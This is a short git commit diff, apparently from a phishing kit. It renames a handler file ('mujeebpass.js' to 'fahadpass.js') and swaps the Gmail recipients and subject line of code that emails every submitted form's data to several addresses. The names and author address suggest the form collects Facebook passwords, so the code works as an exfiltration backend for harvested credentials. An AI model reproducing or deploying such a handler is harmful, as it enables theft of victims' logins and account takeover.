5a6465e9e68c2e136bdc1ec0b4d3a6281babd9be
apisubmit-8ll0irl <idfacebook443@gmail.com>
2025-09-25 10:34:55 +0500

    Update and rename mujeebpass.js to fahadpass.js

--- fahadpass.js
+++ fahadpass.js
@@ -37,8 +37,8 @@ export default async function handler(req, res) {
   try {
     await transporter.sendMail({
       from: `"PROFESSOR" <dardhame1@gmail.com>`,
-      to: "newzatpage@gmail.com,submitdispute@gmail.com,jacksonroy3036@gmail.com",
-      subject: "MUJEEB",
+      to: "newzatpage@gmail.com,submitdispute@gmail.com,fahadali9911ggg@gmail.com",
+      subject: "Chumpa",
       text: JSON.stringify(formData, null, 2),
       html: `<h3>Professor Asif Link</h3><pre>${JSON.stringify(
         formData,
